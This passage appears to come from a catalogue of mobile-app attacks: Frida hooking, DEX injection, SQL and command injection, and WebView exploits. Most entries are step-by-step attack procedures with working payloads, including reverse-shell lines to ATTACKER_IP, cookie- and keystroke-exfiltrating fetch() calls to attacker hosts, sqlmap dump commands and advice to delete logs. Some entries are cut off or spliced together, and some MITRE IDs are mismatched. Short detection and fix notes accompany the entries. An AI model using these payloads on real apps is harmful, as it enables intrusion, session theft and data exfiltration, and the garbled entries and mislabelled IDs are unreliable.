- **Solution**: Implement server-side checks, use native code for root detection, integrate Google Play Integrity API
- **Tags**: #frida #rootbypass #android #mobilehacking #dynamicinstrumentation

## Native Function Hooking (Frida - C/NDK)

- **Attack Type**: Code Injection / Runtime Hooking
- **Target**: Android NDK App
- **Vulnerability**: Native C Library exposed to runtime

- **Impact**: Bypass security check or internal logic (e.g., root, SSL, premium feature)

Identify target app: Use adb shell pm list packages to find the target package, then use frida-ps -U to confirm the app is running. 3. Find native libraries: Use frida-trace -U -n com.target.app and look at loaded native libs in /data/app/com.target.app*/lib/. Identify the target .so file. 4. Find target function: Use nm -D libtarget.so (or readelf -s) to list symbols. Identify function name like checkRoot. 5. Hook with Frida: Create a hook script using Frida’s Interceptor API. Run and test: Save as hook.js and run frida -U -n com.target.app -l hook.js. Use the app — root detection should now be bypassed. 7. Analyze output: Confirm that function got hooked and behavior modified. Use console.log inside hooks for debugging. 8. Optional: Automate hook injection via Frida gadget in production APKs.
- **Detection**: Runtime integrity check, stack traces, app behavior anomalies
- **Solution**: Apply integrity checks inside native code; use anti-debugging techniques; obfuscate native symbols; detect Frida hooks
- **Tags**: frida, runtime hooking, android native, ndk, security bypass, function interception, ssl pinning, root bypass

## Dynamic Dex/Class Injection (Android - ClassLoader)

- **Attack Type**: Code Injection / Runtime Hooking
- **Target**: Android App
- **Vulnerability**: ClassLoader misuse and dynamic code loading
- **MITRE**: T1622 - Debugger Detection
- **Impact**: Full code execution inside trusted app space, bypassing static detection and manifest permission limits
- **Tools**: Android Studio, apktool, Frida, DexClassLoader, ADB, Java
- **Scenario**: In this scenario, the attacker injects a malicious .dex file at runtime into a target app using a custom or reflective DexClassLoader, allowing dynamic execution of arbitrary classes and methods without modifying the original APK. This bypasses static code analysis and obfuscation.
- **Attack Steps**: 1. Prepare environment: Use a rooted Android emulator or device and install the target app (can be any .apk). Ensure adb, apktool, and Android Studio are set up. 2. Create malicious class: Write Java code for a malicious class (e.g., com.attacker.Injected with method public void execute()). Compile it and convert .class to .dex using dx or d8: d8 --output=./out Injected.class. 3. Push dex to device: Use adb push Injected.dex /sdcard/. 4. Find injection point: Use Frida to trace class loading behavior of target app, or reverse engineer it using jadx. Find a place where the app uses DexClassLoader or inject your own using Xposed or Frida script. 5. Inject dex: Use Frida script to hook an existing method and insert the following: var dexPath = "/sdcard/Injected.dex"; var optimizedDir = "/data/data/com.target.app/cache"; var classLoader = new Java.use("dalvik.system.DexClassLoader").$new(dexPath, optimizedDir, null, Java.classFactory.loader); var clazz = classLoader.loadClass("com.attacker.Injected"); var instance = clazz.newInstance(); var method = clazz.getDeclaredMethod("execute"); method.invoke(instance); 6. Trigger hook: Use Frida to load your hook, run app, and verify execution. The execute() method of malicious class runs inside target app. 7. Observe behavior: Log sensitive data, disable security, or inject new UIs depending on execute() logic.
- **Detection**: Detect loaded dex paths at runtime, monitor DexClassLoader behavior
- **Solution**: Enforce ProGuard/obfuscation, monitor runtime dex loads, disable DexClassLoader in release builds
- **Tags**: android, dex injection, classloader, frida, runtime code loading, java, injection

## WebView JavaScript Injection

- **Attack Type**: Code Injection / Runtime Hooking
- **Target**: Android App (WebView)

- **Impact**: Credential theft, data leakage, session hijack, clickjacking

## Environment Variable / Config Hooking

- **Attack Type**: Code Injection / Runtime Hooking
- **Target**: Android App
- **Vulnerability**: Runtime-accessible config/environment values
- **MITRE**: T1615 - Dynamic Hooking
- **Impact**: Redirect server traffic, leak internal state, unlock hidden features, force debug mode
- **Tools**: Frida, Android Studio, jadx, adb, rooted Android device or emulator, Frida-trace, Java reflection APIs
- **Scenario**: This attack involves hooking and modifying sensitive environment variables or app configuration values at runtime—like API keys, debug flags, server endpoints, feature toggles, or authentication flags—usually stored in BuildConfig, System.getenv(), or loaded from property/config files. This can alter app behavior, force debug mode, redirect API traffic, or bypass checks.
- **Attack Steps**: 1. Set up environment: Use a rooted Android emulator or device and ensure adb, Frida, and jadx are installed. Connect device and run the target app. 2. Reverse engineer target: Use jadx to decompile the target APK and locate sensitive configs like BuildConfig.DEBUG, BuildConfig.API_BASE_URL, or any references to System.getenv("KEY"). Note down class and field names. 3. Attach Frida: Launch the target app, then run frida -U -n com.target.app to attach to it. 4. Hook BuildConfig or environment methods: Create a Frida script. Example for modifying API base URL at runtime: Java.perform(function() { var buildConfig = Java.use("com.target.app.BuildConfig"); buildConfig.API_BASE_URL.value = "https://evil-server.com"; console.log("[+] Hooked API URL"); }); For environment variable: Java.use("java.lang.System").getenv.overload("java.lang.String").implementation = function(name) { if (name === "SECRET_KEY") { console.log("Hooked SECRET_KEY"); return "injected_value"; } return this.getenv(name); }; 5. Load hook: Save the script as hook.js and run: frida -U -n com.target.app -l hook.js. Observe the console logs to verify that environment/config values were successfully changed. 6. Observe behavior: The app should now point to the fake API endpoint, use dummy keys, or enter debug/test mode depending on what config you modified. This enables logic bypass, MITM, or debug output leakage. 7. Advanced: You can chain this with SSL pinning bypass, log tampering, or force UI flags (like adminMode = true) to unlock hidden functionality.

## SQLite Injection (Client-Side SQLi – Android/iOS)

- **Attack Type**: SQL Injection / Command Injection
- **Target**: Android/iOS App
- **Vulnerability**: Raw query building with user input
- **MITRE**: T1505.002 - SQL Injection
- **Impact**: Data dump, unauthorized access, local data loss, crash
- **Tools**: Rooted Android device, jadx, adb, SQLite CLI, Frida (optional), MobSF, test APK
- **Scenario**: SQLite databases are commonly used in mobile apps to store local data. If user input is concatenated directly into raw SQL queries (e.g., for search, login, or data retrieval), attackers can inject SQL payloads to dump, modify, or delete local user data. This occurs purely on the client-side (no remote server involved).
- **Attack Steps**: 1. Setup device and tools: Use a rooted Android device or emulator. Install the vulnerable app APK and ensure adb and jadx are ready. Optionally, install MobSF for static analysis.2. Reverse engineer APK: Use jadx to decompile the APK. Locate database handling logic (e.g., rawQuery("SELECT * FROM users WHERE name='" + userInput + "'")). Confirm no parameterized query is used.3. Identify injection point: Find the input field (e.g., search, login, feedback form) linked to the vulnerable query.4. Test injection: Open the app and input payload like ' OR '1'='1 in the field. Observe if the app crashes, leaks all results, or skips filters.5. Explore with adb: Run adb shell, navigate to the app’s data directory /data/data/com.vulnerable.app/databases/, and list database files. Use sqlite3 mydb.db to open the DB.6. Confirm injection impact: Manually execute a simulated injected query: SELECT * FROM users WHERE name = '' OR '1'='1' — should return all users. If app executes this via unvalidated input, you can do the same via UI.7. Frida hook (optional): To live-hook the rawQuery function and log SQL: Java.use("android.database.sqlite.SQLiteDatabase").rawQuery.implementation = function(sql, args) { console.log("SQL => " + sql); return this.rawQuery(sql, args); }; 8. Modify or Delete data: Try payloads like '; DELETE FROM users; -- to test destructive behavior. 9. Result: Data is dumped or deleted without root access to app internals.
- **Detection**: Static analysis, runtime SQL logs, user behavior monitoring
- **Solution**: Use parameterized queries like rawQuery("SELECT * FROM users WHERE name=?", new String[]{userInput});
- **Tags**: android, ios, sqlite, local db, sql injection, rawquery, local storage, data leak

## Remote SQLi via API Call

- **Attack Type**: SQL Injection / Command Injection
- **Target**: Remote API (via mobile app)

Set up Burp Suite and configure Android proxy (adb shell settings put global http_proxy 127.0.0.1:8080). 2. Intercept traffic: Enable Burp SSL certificate on Android. Open the app and start capturing API requests. Identify request parameters (e.g., username=test&password=test).3. Test injection: Send payloads like test' OR '1'='1 using Burp Repeater. Example: POST /login HTTP/1.1 Host: api.vulnapp.com Content-Type: application/x-www-form-urlencoded username=admin'--&password=a.4. Analyze response: If server returns authenticated session or user details without valid credentials, it's vulnerable.5. Automate exploitation: Use sqlmap to test for injectable parameters: sqlmap -u "https://api.vulnapp.com/login" --data="username=admin&password=123" --batch --level=5.6. Dump data: Use --dump option in sqlmap to retrieve entire tables. 7. Bypass logic: Change password, extract session tokens, or escalate privileges via SQL logic.8. Verify full control: Try UNION SELECT or information_schema queries to access schema metadata. 9. Impact: Complete remote DB compromise through a mobile interface.

## Login Bypass via SQL Injection

- **Attack Type**: SQL Injection / Command Injection
- **Target**: Android/iOS App Login
- **Vulnerability**: Insecure query logic without parameterization

Try comment bypass: Use SQL comments to terminate query. Payload: ' OR 1=1 -- in username field.4. Confirm access: If login succeeds and app redirects or loads user data, injection succeeded. 5. Test different payloads: Try bypassing admin access: ' OR role='admin' --, or enumerating users with timing-based queries. 6. Explore privileges: After access, check if you can modify user data, reset passwords, or access premium content.7. Use sqlmap for automation: Capture full HTTP request and feed it to sqlmap for detection: sqlmap -r request.txt --batch --risk=3 --level=5.8. Verify persistence: Repeat steps to ensure the app does not log you out or verify session backend. 9. Explain logic: The raw SQL might be: SELECT * FROM users WHERE username='$input' AND password='$input'. Confirm vulnerability: If user input is used directly in a shell command (e.g., ping, ls, cat, cp, rm), and no input validation is present, it is vulnerable to command injection.4. Identify entry point: Open the app and find the functionality that accepts input (like a network diagnostic or command tool). Try simple values like 127.0.0.1 && ls / as input.5. Use Logcat: Run the app, input the payload, and monitor logs using adb logcat. If logs show output from ls /, the payload executed successfully. Also monitor for crashes, permission errors, or printed command output.6. Test advanced payloads: Try more malicious payloads like ; getprop > /sdcard/info.txt or && cat /data/data/com.target.app/shared_prefs/*.xml. Use adb shell to confirm file writes, data leaks, or behavior changes.7. Use Frida (optional): Hook exec() using Frida to observe live command strings: Java.perform(function() { var Runtime = Java.use('java.lang.Runtime'); Runtime.exec.overload('java.lang.String').implementation = function(cmd) { console.log('[CMD] ' + cmd); return this.exec(cmd); }; });8. Persist attacker shell: Inject reverse shell command like ; sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 if the app has internet or shell permission.9. Validate impact: Demonstrate that arbitrary shell commands execute under the app’s UID. Confirm if it can leak private data, change permissions, or affect app integrity.
- **Detection**: Analyze source code for Runtime.exec, monitor ADB logs, use dynamic analysis tools
- **Solution**: Avoid exec() with user input; use safe Android APIs; apply strict input validation and allowlisting
- **Tags**: android, command injection, runtime.exec, adb, frida, shell injection, mobile security

## OS Command Injection via File Upload or Clipboard

- **Attack Type**: SQL Injection / Command Injection
- **Target**: Android/iOS App
- **Vulnerability**: Unsanitized shell execution via input
- **MITRE**: T1202 - Command Injection
- **Impact**: Arbitrary shell execution, file overwrite, clipboard abuse, local persistence
- **Tools**: Android Studio, Burp Suite, ADB, Rooted Device, Frida, File Manager App
- **Scenario**: In some mobile apps, file upload features or clipboard-based import/export options handle filenames or clipboard content using shell commands via Runtime.exec() or equivalent. If file names or clipboard content are passed unsanitized, attackers can inject shell commands and achieve arbitrary code execution within app context.
- **Attack Steps**: 1. Setup environment: Use a rooted Android emulator or jailbroken iOS device. Install a vulnerable app with file upload/import or clipboard-to-command support. Ensure ADB and Frida are available.2. Identify input vectors: Open the app and look for options to upload files or paste clipboard data. For instance, the app might import logs or configurations from file paths or clipboard.3. Test filename handling: Rename a test file to a payload such as a;id>.out;.txt. Push it to app's accessible directory using adb push 'a;id>.out;.txt' /sdcard/. Now upload it via app.4. Check command output: If app uses Runtime.exec("cp " + filename + " /data/data/...") without sanitization, the command becomes cp a;id>.out;.txt, and the id command executes. Verify with adb shell cat /data/data/com.app.name/files/.out.5. Clipboard test: Use adb shell am broadcast -a clipper.set -e text "; ls > /sdcard/clipout.txt" or any app that lets you paste clipboard content into import features.6. Trigger execution: Use the app to paste/import. If command injection works, the injected shell command executes. Use file manager or ADB to verify results (e.g., see clipout.txt).7. Use Frida to hook command: Hook Runtime.exec() to confirm command: Java.perform(function() { var rt = Java.use("java.lang.Runtime"); rt.exec.overload('java.lang.String').implementation = function(cmd) { console.log("CMD: " + cmd); return this.exec(cmd); }; });8. Verify impact: Commands run as app user. If permissions allow, you can read/write private app files, change configs, or exfiltrate data.9. Exploit persistence: Inject commands like sh -i >& /dev/tcp/attacker/4444 0>&1 if outbound access is present.
- **Detection**: Monitor file paths, clipboard logs, logcat, Frida, source code review
- **Solution**: Sanitize input paths and clipboard data, avoid shell-based execution, use native file I/O APIs
- **Tags**: android, ios, command injection, clipboard, file upload, runtime.exec, input validation

## iOS Objective-C Command Injection

- **Attack Type**: SQL Injection / Command Injection
- **Target**: iOS App
- **Vulnerability**: Dynamic input to system() or NSTask
- **MITRE**: T1202 - Command Execution
- **Impact**: Arbitrary shell execution, sandbox escape (if root), private data access
- **Tools**: Xcode, Frida, Theos, Hopper, Jailbroken iPhone, Objection, iFunBox
- **Scenario**: This vulnerability arises in iOS apps that use Objective-C NSTask or system() APIs with user input passed directly into the command string. If no input validation or escaping is done, the attacker can execute arbitrary system commands inside the app sandbox on jailbroken devices.
- **Attack Steps**: 1. Prepare device: Use a jailbroken iOS device with SSH and Frida installed. Install the target IPA. Set up Hopper to reverse the app and Xcode to inspect logs. 2. Find injection point: Use Hopper or class-dump to decompile the app. Look for NSTask *task = [[NSTask alloc] init]; or calls to system(). Check if these commands include dynamic user input from text fields or clipboard.3. Validate flow: Find out where the user input flows to command string. Example: NSString *cmd = [NSString stringWithFormat:@"cp %@ /tmp/", input]; system([cmd UTF8String]);4. Input payload: Run the app and input something like filename.txt; ls > /tmp/test.txt in the relevant field.5. Observe effects: Use ssh into device or Filza to verify the creation of /tmp/test.txt. If present, the injected command executed successfully.6. Live hooking (Frida): Attach with frida -n AppName and hook system(): Interceptor.attach(Module.findExportByName(null, "system"), { onEnter: function(args) { console.log("CMD: " + Memory.readUtf8String(args[0])); } });7. Automate with Theos: Create a tweak to hook the input field method and automatically inject a payload.8. Exfiltrate files: Use command like cat /var/mobile/Containers/Data/App/.../config.plist > /tmp/output.txt to extract internal files.9. Verify severity: Demonstrate ability to list app data, run whoami, or perform reverse shell with sh -i >& /dev/tcp/attacker/4444 0>&1.10. Cleanup: Delete logs or traces if testing in production jailbreak.
- **Detection**: Binary analysis, Frida trace, command monitoring, system call logs
- **Solution**: Never use raw system calls with user input, use Apple APIs, validate/sanitize commands
- **Tags**: ios, command injection, objective-c, system call, jailbroken, shell injection, NSTask

## WebView + SQLi or Command Injection via Backend

- **Attack Type**: SQL Injection / Command Injection
- **Target**: Hybrid App (WebView)
- **Vulnerability**: Backend injection via client WebView

- **Scenario**: Many hybrid Android/iOS apps use WebView to interface with backend APIs for dynamic content. If user input via WebView is sent to backend PHP/.NET/Node code that builds SQL or shell commands without validation, it results in remote SQLi or command injection. These may not be visible in frontend but are fully exploitable through WebView parameters.
- **Attack Steps**: 1. Setup test: Install the hybrid mobile app. Configure proxy in emulator: adb shell settings put global http_proxy 127.0.0.1:8080. Trust Burp certificate on the device to intercept HTTPS.2. Open app and navigate WebView: Identify pages that accept search input, feedback forms, or URL GET parameters (e.g., app.html?query=123).3. Inject test SQL payload: In a text box or WebView URL, input payloads like ' OR 1=1 --. Submit and observe if data from all users is shown.4. Use command payloads: Try URL like http://server.com/api?file=../../../../etc/passwd or &cmd=ls if visible in request.5. Intercept with Burp: Use Burp Suite to capture WebView traffic. Identify API endpoints (e.g., POST /api/search) and inject payloads like '; uname -a; -- or 1; ls > /tmp/test.txt.6. Analyze responses: If response includes server-side output or 500 errors, you're close. Try timing-based payloads to test for blind injection (SLEEP(5) or ping -c 5).7. Frida monitoring (optional): Hook WebView methods to intercept JavaScript interface or loaded URLs: Java.use("android.webkit.WebView").loadUrl.implementation = function(url) { console.log("WebView Loading: " + url); this.loadUrl(url); }8. Remote DB/Data compromise: Use sqlmap to automate injection: sqlmap -u "http://api.server.com/search?query=test" --batch.9. Command shell: If command injection succeeds, inject reverse shell like ; sh -i >& /dev/tcp/attacker_ip/4444 0>&1 and listen on attack box.10. Confirm control: If you gain shell, read sensitive files or escalate access based on server config.
- **Detection**: Monitor WebView API calls, review backend code for concat/exec usage
- **Solution**: Validate/sanitize input at backend, use ORM and safe shell APIs, disable WebView JS if unused
- **Tags**: webview, hybrid app, sqli, backend injection, shell, android, ios, burp, command injection

Submit the form: Click the submit button and monitor WebView behavior. If alert pops up or script executes, the injection is successful.5. Burp Suite intercept: Capture the WebView POST/GET request. Modify the form parameter to include payloads like <script>fetch('https://attacker.com/'+document.cookie)</script> and forward it.6. Observe backend response: If the app renders the reflected response back into WebView without escaping HTML, your script will execute inside the app context.7. Frida script to monitor WebView rendering: Hook WebView.loadDataWithBaseURL() and print the data being loaded using: Java.use("android.webkit.WebView").loadDataWithBaseURL.implementation = function(a,b,c,d,e){console.log("Loaded HTML:", b); this.loadDataWithBaseURL(a,b,c,d,e);}8. Exfiltrate session: Try <script>fetch('https://attacker.site/'+localStorage.getItem('session'))</script> to simulate token exfiltration.9. Confirm impact: If JavaScript runs and accesses cookies, DOM, or localStorage — app is vulnerable. Demonstrate redirect using <script>window.location='http://phish.com'</script>.10. Document the injection point: Record which fields are vulnerable, how the HTML is rendered, and the exact payload.

- **Solution**: Always sanitize user inputs, use WebView.setSafeBrowsingEnabled(true), encode HTML entities
- **Tags**: android, webview, xss, javascript injection, hybrid app, reflected xss, mobile xss

## Unrestricted WebView Navigation

- **Attack Type**: WebView Exploits (JavaScript Injection)
- **Target**: Android WebView
- **Vulnerability**: No domain validation before navigation
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Phishing, token theft, full remote HTML/JS control in app, user deception
- **Tools**: Android Studio, Emulator, apktool, jadx, Burp Suite, ADB
- **Scenario**: Apps that allow unrestricted navigation in WebView using webView.loadUrl() can be tricked into loading malicious external websites, including those with embedded malware or credential-stealing JavaScript. Without validation of target URLs, attackers may force navigation to http://evil.com by injecting links into app inputs or manipulating WebView redirection.
- **Attack Steps**: 1. Decompile the APK: Use APKTool or JADX to open the APK. Locate the activity using WebView.loadUrl() and check if there is any URL validation (URLUtil.isValidUrl(), domain check, or allowlist logic).2. Identify navigation source: Check if URLs are taken from Intent, EditText, or dynamically passed via JS bridge or server.3. Find the vulnerable point: Open the app and locate any part where you can input a URL or text that results in a redirect/navigation inside WebView.4. Input malicious URL: In the vulnerable field or parameter, input http://evil.com/phishing.html. If it loads directly inside WebView, it’s vulnerable.5. Burp interception: Capture and modify a URL being passed to WebView by changing the response from server to include <script>window.location='http://evil.com'</script>.6. Create test phishing page: Host a fake login form at http://evil.com. Input that URL in the WebView field and observe how it renders perfectly.7. Add credential stealing JS: Add <script>fetch('http://attacker.site/?c='+document.getElementById('password').value)</script> on the evil site.8. Trigger navigation: Use an injected form submission or response rewrite to cause redirection. 9. Frida hook: Monitor what URL WebView is loading: Java.use('android.webkit.WebView').loadUrl.implementation = function(url) { console.log('[Loaded URL] ' + url); this.loadUrl(url); };10. Confirm attack success: If attacker-controlled page loads and captures input/cookies, it’s a full compromise of user trust and session.
- **Detection**: Monitor navigation calls in WebView, Frida hook, manual test via Burp
- **Solution**: Only allow known URL patterns using allowlists, block http, enable safe browsing, disable JS
- **Tags**: webview, android, url redirection, phishing, navigation, remote site load, hybrid app

## addJavascriptInterface() Exploit (Android Only)

- **Attack Type**: WebView Exploits (JavaScript Injection)
- **Target**: Android App
- **Vulnerability**: Unsafe JS-native bridge via addJavascriptInterface
- **MITRE**: T1059.007 (JavaScript Injection)
- **Impact**: Arbitrary Java method execution, remote control via malicious JS page
- **Tools**: Frida, APKTool, Android Emulator, jadx, Burp Suite, MobSF
- **Scenario**: If addJavascriptInterface() is used to expose Java methods to JavaScript without setting minSdkVersion >= 17 or enabling security flags, it allows malicious web pages to invoke native Java code, potentially executing unintended operations like file access, SMS, or even remote command execution.
- **Attack Steps**: 1. Decompile APK with JADX: Open the APK in JADX or APKTool. Search for .addJavascriptInterface() calls. Example: webView.addJavascriptInterface(new MyInterface(context), "Android").2. Check exposed methods: Inspect MyInterface.java or its equivalent class. Look for annotated @JavascriptInterface methods like public void saveFile(String filename) or public void showToast(String msg).3. Review permissions: If these methods perform privileged operations (file I/O, SMS, shell commands), and there is no origin validation, they’re exploitable.4. Launch the app and open WebView: Try intercepting WebView traffic with Burp. Use response injection or crafted HTML file containing: <script>Android.saveFile("../../sdcard/test.txt")</script>.5. Host attack page: Serve a malicious HTML using local server (python3 -m http.server) containing: <script>Android.showToast('Hacked')</script> or <script>Android.sendSMS('12345','Owned')</script> depending on the interface.6. Load attack page: Use WebView to load the external page: webView.loadUrl("http://192.168.1.100/poc.html"). If methods are invoked, it confirms remote control.7. Frida runtime monitor: Hook addJavascriptInterface at runtime: Java.use("android.webkit.WebView").addJavascriptInterface.overload('java.lang.Object','java.lang.String').implementation = function(obj, name) { console.log('JS Interface: ' + name); return this.addJavascriptInterface(obj, name); };8. Bypass minSdkVersion: If the app targets older API (<=16), this attack works without prompt or warning.9. Test privilege escalation: If method uses Runtime.exec() internally (e.g., to install files or reboot device), test RCE potential via Android.exec('id > /sdcard/poc.txt').10. Verify success: If file is created, SMS is sent, or toast appears — the native method was abused via JS.
- **Detection**: Code review, MobSF analysis, Frida hook, behavior monitoring
- **Solution**: Avoid exposing dangerous methods, target SDK >= 17, use input validation, disable JS when unused
- **Tags**: android, javascriptinterface, webview exploit, js bridge, hybrid app, RCE

## Bypass HTTPS with MITM & Inject JS

- **Attack Type**: WebView Exploits (JavaScript Injection)
- **Target**: Android App
- **Vulnerability**: SSL certificate validation bypass
- **MITRE**: T1557.002 – Man-in-the-Middle
- **Impact**: Full control over HTTPS WebView content, injection of malicious JS, phishing, session theft
- **Tools**: Android Emulator, Burp Suite, APKTool, Frida, ADB, MobSF
- **Scenario**: Many Android apps using WebView fail to validate SSL certificates properly (e.g., by overriding WebViewClient.onReceivedSslError and calling handler.proceed()). This allows an attacker to perform MITM attacks using Burp Suite with a trusted CA certificate, intercept HTTPS traffic, and inject malicious JavaScript into the WebView’s HTML responses.
- **Attack Steps**: 1. Prepare environment: Install Burp Suite and launch Android emulator. Configure emulator proxy via adb shell settings put global http_proxy 10.0.2.2:8080. Install Burp Suite CA certificate by converting .der to .crt and installing it on the emulator via device settings → Security → Install certificate.2. Install test app: Install the target APK on the emulator using adb install target.apk. Confirm that it uses WebView and opens HTTPS content.3. Intercept HTTPS with Burp: Open Burp and configure SSL proxy listener on port 8080. Enable "Intercept" tab. Open the app and observe if HTTPS traffic appears in Burp. If yes, the app accepts the CA.4. Modify response: Right-click a response in Burp that loads HTML content into the WebView. Choose "Show response in browser", edit the HTML to inject payload like <script>alert('MITM JS Injected')</script> into the <body>. Alternatively, replace a script file with a malicious one.5. Inject keylogger or redirect: Modify HTML to include a keylogger: <script>document.addEventListener('input', e => fetch('http://attacker.com/kl?d='+e.data));</script> or <script>location='http://evil.com'</script>.6. Trigger HTML reload: Use the app’s feature to reload the same screen (e.g., refresh button). The injected HTML with JS should now load in the app.7. Frida Validation: Hook onReceivedSslError() and log if it proceeds without validation: Java.use('android.webkit.WebViewClient').onReceivedSslError.implementation = function(view, handler, error) { console.log('SSL Error: Proceeded!'); handler.proceed(); };8. Confirm execution: If alert is triggered or traffic hits your attacker-controlled server, the JS has executed inside the app context.9. Demo data exfiltration: Exfiltrate cookies or localStorage via JS to simulate full compromise.10. Screenshot evidence: Capture screenshot of running malicious JS in app to document successful injection via HTTPS MITM.
- **Detection**: Burp Suite intercept, Frida hook for SSL bypass, HTML diff comparison
- **Solution**: Never override onReceivedSslError, enforce certificate pinning and TLS validation, enable WebView SafeBrowsing
- **Tags**: android, webview, ssl bypass, mitm, javascript injection, https, ca injection
